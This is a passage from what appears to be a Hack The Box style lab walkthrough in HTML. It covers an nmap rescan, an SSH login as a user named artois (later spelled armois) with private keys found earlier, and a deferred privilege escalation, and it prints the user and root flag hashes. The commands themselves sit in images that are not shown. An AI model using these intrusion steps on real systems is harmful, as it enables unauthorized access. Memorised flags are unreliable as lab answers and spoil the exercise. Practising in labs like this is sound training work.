<div class="page" id="nmap scan"><h1><b><u>nmap scan</u></b></h1><span style="color:#24ff00;">lets scan our victim machine again to see if </span><span style="color:#ffa500;">SSH</span><span style="color:#24ff00;"> is now open<br/></span><img alt="images/687-1.png" src="images/687-1.png"/><br/><br/>its open!<br/><img alt="images/687-2.png" src="images/687-2.png"/></div>
<div class="page" id="ssh"><h1><b><u>ssh</u></b></h1><span style="color:#24ff00;">remember the </span><span style="color:#ffff00;">public</span><span style="color:#24ff00;"> and </span><span style="color:#ffff00;">private keys</span><span style="color:#24ff00;"> we found in that picture back earlier? time to use them and ssh into </span><span style="color:#ffff00;">artois</span> <span style="color:#24ff00;">since his name was mentioned back in the notes webpage</span><br/><img alt="images/688-1.png" src="images/688-1.png"/><br/><br/><span style="color:#24ff00;">lets </span><span style="color:#ffa500;">chmod</span> <span style="color:#ffa500;">600</span> <span style="color:#24ff00;">the key and try logging in:</span><br/><img alt="images/688-2.png" src="images/688-2.png"/><br/><br/><br/><img alt="images/688-3.png" src="images/688-3.png"/><br/><br/><span style="color:#24ff00;">and we have it! we're logged in as </span><span style="color:#ffff00;">armois</span><span style="color:#24ff00;">, privesc from here will be the same as before..</span><br/><img alt="images/688-4.png" src="images/688-4.png"/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/682-1.png" src="images/682-1.png"/><br/><span style="color:#ffff00;">82a864f9eec2a76c166ec7b1078ca6c8<br/><br/></span><img alt="images/682-2.png" src="images/682-2.png"/><br/>8a2b4956612b485720694fb45849ec3a</div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1967-1.png" src="images/1967-1.png"/></div>
</div></body></html>